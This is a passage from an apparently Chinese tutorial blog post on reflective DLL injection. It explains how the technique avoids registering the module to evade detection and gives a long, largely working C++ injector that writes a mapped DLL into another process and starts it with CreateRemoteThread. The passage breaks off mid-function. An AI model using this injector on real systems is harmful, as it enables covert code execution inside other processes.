id="反射型DLL注入">反射型DLL注入</h2><p>它和上面的注入方式不一样的地方在于我们不使用LoadLibrary函数去装载DLL，它没有向操作系统注册本身，从一定程度上规避了部分检测。</p><p>流程：</p><p>注入器找到目标进程句柄，申请一段内存写入DLL文件，DLL文件中有自展开代码，通过导出表找到自展开代码，注入器创建远程线程执行自展开代码。加载完毕，跳转到DLLmain执行逻辑。</p><h3 id="细节">细节</h3><p>这里要注意一个地方：<br>如果现在本身空间展开，然后复制到目标进程，那么会导致基地址不对，进而导致重定位表修复失效，与此同时，修复的模块的导入表也对不上，所以需要在目标进程中修复。</p><p>但是如果执行了loadLibrary那就和普通的远程线程注入一样了，所以只能递归调用我们写的LoadLibrary?<br>有什么方法可以避免吗？基地址可以通过在目标进程分配好空间之后来固定在loader中的内存地址来实现，然后系统DLL的函数地址肯定是固定的，所以只要没有使用额外的DLL，也可以直接在主内存展开后再复制过去。</p><p>同时，在加载的时候，如果不是把展开写在DLL里面，就要在DLL里面写一个导出函数，用它去执行dllmain，否则createremotethread函数不支持多参数进程，不能直接调用。所以要写遍历导入表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>导入表结构，通过同时遍历AddressOfFunctions，AddressOfNames和AddressOfNameOrdinals查找对应偏移地址。其中函数名和序号数组是同步的，对应位置的函数名对应对应的序号。</p><p>需要的WindowsAPI如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//CreateToolhelp32Snapshot();//枚举进程,然后比较进程名pe.szExeFile和已知字符串获取句柄</span></span><br><span class="line">OpenProcess();<span class="comment">//通过pid获取句柄</span></span><br><span class="line"></span><br><span class="line">VirtualAllocEx();<span class="comment">//申请空间</span></span><br><span class="line">WriteProcessMemory();<span class="comment">//写入内容</span></span><br><span class="line">CreatRemoteThread();<span class="comment">//创建线程</span></span><br><span class="line"></span><br><span class="line">GetModuleHandle();<span class="comment">//取模块句柄</span></span><br><span class="line">GetProcAddress();<span class="comment">//取函数地址</span></span><br></pre></td></tr></table></figure><p>但是如果是在自己的进程先执行，然后复制到目标进程进行操作（只要不涉及导入其它库就可以）那么在目标进程中只有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OpenProcess();<span class="comment">//通过pid获取句柄</span></span><br><span class="line"></span><br><span class="line">VirtualAllocEx();<span class="comment">//申请空间</span></span><br><span class="line">WriteProcessMemory();<span class="comment">//写入内容</span></span><br><span class="line">CreatRemoteThread();<span class="comment">//创建线程</span></span><br></pre></td></tr></table></figure><h2 id="实践">实践</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ReflectLoader.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* DLLpath = <span class="string">&quot;C:\\Users\\a2879\\source\\repos\\DLLreflectLoader\\x64\\Debug\\messageboxDLL.dll&quot;</span>;</span><br><span class="line">DWORD dwPid = <span class="number">0</span>;</span><br><span class="line">std::cin &gt;&gt; dwPid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">ReflectLoader <span class="title">myPE</span><span class="params">(dwPid, DLLpath)</span></span>;</span><br><span class="line"><span class="comment">//myPE.setflag(1);</span></span><br><span class="line">myPE.<span class="built_in">run</span>(<span class="string">&quot;getInMain&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ReflectLoader.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectLoader</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">HANDLE hTargetProcess;</span><br><span class="line">LPVOID remoteMem;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* targetPath;</span><br><span class="line">std::unique_ptr&lt;BYTE[]&gt; fileBase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PIMAGE_DOS_HEADER dosHeader;</span><br><span class="line">PIMAGE_NT_HEADERS ntHeader;</span><br><span class="line">PIMAGE_FILE_HEADER fileHeader;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER optionalHeader;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> memSize;</span><br><span class="line"><span class="type">size_t</span> memHeaderSize;</span><br><span class="line"><span class="type">size_t</span> sectionAlignment;</span><br><span class="line">DWORD64 imageBase;</span><br><span class="line"></span><br><span class="line">BYTE flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line"><span class="built_in">ReflectLoader</span>(DWORD dwPid, <span class="type">const</span> <span class="type">char</span>* dllPath) &#123;</span><br><span class="line">hTargetProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">fileBase = <span class="built_in">mapToMemory</span>(dllPath);</span><br><span class="line"><span class="built_in">loadPEstruct</span>(fileBase.<span class="built_in">get</span>());</span><br><span class="line">remoteMem = <span class="built_in">VirtualAllocEx</span>(hTargetProcess, <span class="literal">NULL</span>, memSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">run</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* expFuncName)</span> </span>&#123;</span><br><span class="line">LPVOID memBase = <span class="built_in">VirtualAllocEx</span>(<span class="built_in">GetCurrentProcess</span>(), remoteMem, memSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!memBase) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">makeHeadandSectionMap</span>(memBase, fileBase.<span class="built_in">get</span>());</span><br><span class="line"><span class="built_in">repareReloc</span>(memBase);</span><br><span class="line"><span class="built_in">repareIAT</span>(memBase);</span><br><span class="line"><span class="built_in">setImageBase</span>(memBase);</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> bytesWritten;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hTargetProcess, remoteMem, memBase, memSize, &amp;bytesWritten);</span><br><span class="line"><span class="keyword">if</span> (bytesWritten != memSize) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;写入目标进程失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPVOID targetFunc = <span class="built_in">getExplor</span>(memBase, expFuncName);</span><br><span class="line"><span class="built_in">CreateRemoteThread</span>(hTargetProcess,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">(LPTHREAD_START_ROUTINE)targetFunc,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="function">std::unique_ptr&lt;BYTE[]&gt; <span class="title">mapToMemory</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filePath)</span> </span>&#123;</span><br><span class="line">FILE* file;</span><br><span class="line"><span class="type">errno_t</span> err = <span class="built_in">fopen_s</span>(&amp;file, filePath, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fseek</span>(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line"><span class="type">size_t</span> fileSize = <span class="built_in">ftell</span>(file);</span><br><span class="line"><span class="built_in">fseek</span>(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line"><span class="function">std::unique_ptr&lt;BYTE[]&gt; <span class="title">fileData</span><span class="params">(<span class="keyword">new</span> BYTE[fileSize])</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!fileData) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fread</span>(fileData.<span class="built_in">get</span>(), <span class="number">1</span>, fileSize, file);</span><br><span class="line"><span class="built_in">fclose</span>(file);</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;成功申请内存: 0x%llX\n&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(fileData.<span class="built_in">get</span>()));</span><br><span class="line"><span class="keyword">return</span> fileData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">loadPEstruct</span><span class="params">(BYTE* rawdata)</span> </span>&#123;</span><br><span class="line">dosHeader = (PIMAGE_DOS_HEADER)rawdata;</span><br><span class="line">ntHeader = (PIMAGE_NT_HEADERS)(rawdata + dosHeader-&gt;e_lfanew);</span><br><span class="line">fileHeader = &amp;(ntHeader-&gt;FileHeader);</span><br><span class="line">optionalHeader = &amp;(ntHeader-&gt;OptionalHeader);</span><br><span class="line"></span><br><span class="line">imageBase = optionalHeader-&gt;ImageBase;</span><br><span class="line">memSize = optionalHeader-&gt;SizeOfImage;</span><br><span class="line">memHeaderSize = optionalHeader-&gt;SizeOfHeaders;</span><br><span class="line">sectionAlignment = optionalHeader-&gt;SectionAlignment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">makeHeadandSectionMap</span><span class="params">(LPVOID memBase, <span class="type">const</span> BYTE* fileBase)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------开始映射节区--------\n&quot;</span>);</span><br><span class="line"><span class="built_in">RtlMoveMemory</span>(memBase, fileBase, memHeaderSize);</span><br><span class="line"></span><br><span class="line">PIMAGE_SECTION_HEADER sectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(ntHeader);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; fileHeader-&gt;NumberOfSections; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (sectionHeader[i].VirtualAddress == <span class="number">0</span> &amp;&amp; sectionHeader[i].SizeOfRawData == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID srcMem = (LPVOID)(fileBase + sectionHeader[i].PointerToRawData);</span><br><span class="line">LPVOID dstMem = (BYTE*)memBase + sectionHeader[i].VirtualAddress;</span><br><span class="line"><span class="type">size_t</span> sizeOfRawData = sectionHeader[i].SizeOfRawData;</span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(dstMem, srcMem, sizeOfRawData);</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - 节区%d: %s, 映射到内存 0x%llX\n&quot;</span>, i, sectionHeader[i].Name, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(dstMem));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------映射节区结束--------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">repareReloc</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------开始修复重定位表-------\n&quot;</span>);</span><br><span class="line">PIMAGE_BASE_RELOCATION relTable = (PIMAGE_BASE_RELOCATION)((BYTE*)memBase + optionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line"><span class="type">size_t</span> delta = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(memBase) - optionalHeader-&gt;ImageBase;</span><br><span class="line"><span class="keyword">if</span> (relTable == <span class="literal">nullptr</span> || delta == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (relTable-&gt;SizeOfBlock != <span class="number">0</span> &amp;&amp; relTable-&gt;VirtualAddress != <span class="number">0</span>) &#123;</span><br><span class="line">WORD* pRdata = (WORD*)((BYTE*)relTable + <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line"><span class="type">size_t</span> dataNum = (relTable-&gt;SizeOfBlock - <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="built_in">sizeof</span>(WORD);</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - 表%d:\n&quot;</span>, j);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dataNum; i++) &#123;</span><br><span class="line">DWORD type = pRdata[i] &gt;&gt; <span class="number">12</span>;</span><br><span class="line"><span class="keyword">if</span> (type == IMAGE_REL_BASED_DIR64) &#123;</span><br><span class="line">DWORD64* targetAddress = (DWORD64*)((BYTE*)memBase + relTable-&gt;VirtualAddress + (pRdata[i] &amp; <span class="number">0xFFF</span>));</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 对应地址: 0x%llX 数据: 0x%llX\n&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(targetAddress), *targetAddress);</span><br><span class="line">*targetAddress += delta;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   -&gt; 0x%llX  delta: 0x%llX\n&quot;</span>, *targetAddress, delta);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">relTable = (PIMAGE_BASE_RELOCATION)((BYTE*)relTable + relTable-&gt;SizeOfBlock);</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------修复重定位表结束-------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">repareIAT</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------开始修复IAT--------\n&quot;</span>);</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)memBase + optionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line"><span class="keyword">while</span> (importDesc-&gt;OriginalFirstThunk) &#123;</span><br><span class="line"><span class="type">char</span>* Dllname = (<span class="type">char</span>*)((BYTE*)memBase + importDesc-&gt;Name);</span><br><span class="line">HMODULE hDll = <span class="built_in">GetModuleHandleA</span>(Dllname);</span><br><span class="line"><span class="keyword">if</span> (!hDll) &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - 加载DLL:%s\n&quot;</span>, Dllname);</span><br><span class="line">hDll = <span class="built_in">LoadLibraryA</span>(Dllname);</span><br><span class="line"><span class="keyword">if</span> (!hDll) &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - 加载DLL失败,导入函数终止\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - DLL已存在:%s\n&quot;</span>, Dllname);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_THUNK_DATA INT = (PIMAGE_THUNK_DATA)((BYTE*)memBase + importDesc-&gt;OriginalFirstThunk);</span><br><span class="line">PIMAGE_THUNK_DATA IAT = (PIMAGE_THUNK_DATA)((BYTE*)memBase + importDesc-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; INT[i].u1.AddressOfData; i++) &#123;</span><br><span class="line">DWORD64 pFunc = <span class="literal">NULL</span>;</span><br><span class="line">DWORD64 targetFunc = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;((BYTE*)memBase + INT[i].u1.AddressOfData);</span><br><span class="line"><span class="keyword">if</span> (targetFunc &amp; IMAGE_ORDINAL_FLAG) &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 以序号:%d 导入函数\n&quot;</span>, <span class="built_in">IMAGE_ORDINAL</span>(targetFunc));</span><br><span class="line">pFunc = (DWORD64)<span class="built_in">GetProcAddress</span>(hDll, <span class="built_in">MAKEINTRESOURCEA</span>(<span class="built_in">IMAGE_ORDINAL</span>(targetFunc)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 以名称:%s 导入函数\n&quot;</span>, ((PIMAGE_IMPORT_BY_NAME)targetFunc)-&gt;Name);</span><br><span class="line">pFunc = (DWORD64)<span class="built_in">GetProcAddress</span>(hDll, ((PIMAGE_IMPORT_BY_NAME)targetFunc)-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pFunc) &#123;</span><br><span class="line">IAT[i].u1.Function = pFunc;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 函数导入成功\n   - 目的地址: 0x%llX\n&quot;</span>, pFunc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 函数导入失败\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">importDesc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------修复IAT结束--------\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">setImageBase</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line">IMAGE_DOS_HEADER* dosHeader = (PIMAGE_DOS_HEADER)memBase;</span><br><span class="line">IMAGE_NT_HEADERS* ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)memBase + dosHeader-&gt;e_lfanew);</span><br><span class="line">ntHeader-&gt;OptionalHeader.ImageBase = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(memBase);</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------修正镜像基地址成功--------\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LPVOID <span class="title">getExplor</span><span class="params">(LPVOID memBase, <span class="type">const</span> <span class="type">char</span>* funcName)</span> </span>&#123;</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)memBase + (optionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));</span><br><span class="line">DWORD* addrOfNames = (DWORD*)((BYTE*)memBase + exp-&gt;AddressOfNames);</span><br><span class="line">DWORD dwNumOfName = exp-&gt;NumberOfNames;</span><br><span class="line"><span class="type">char</span>* pFuncName;</span><br><span class="line">DWORD* addrOfFunc = (DWORD*)((BYTE*)memBase + exp-&gt;AddressOfFunctions);</span><br><span class="line">DWORD* addrOfNameofNameOrdinals = (DWORD*)((BYTE*)memBase + exp-&gt;AddressOfNameOrdinals);</span><br><span class="line">LPVOID Func = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dwNumOfName; i++)</span><br><span class="line">&#123;</span><br><span class="line">pFuncName = (<span class="type">char</span>*)((BYTE*)memBase + addrOfNames[i]);</span><br><span class="line"><span class="keyword">if</span> 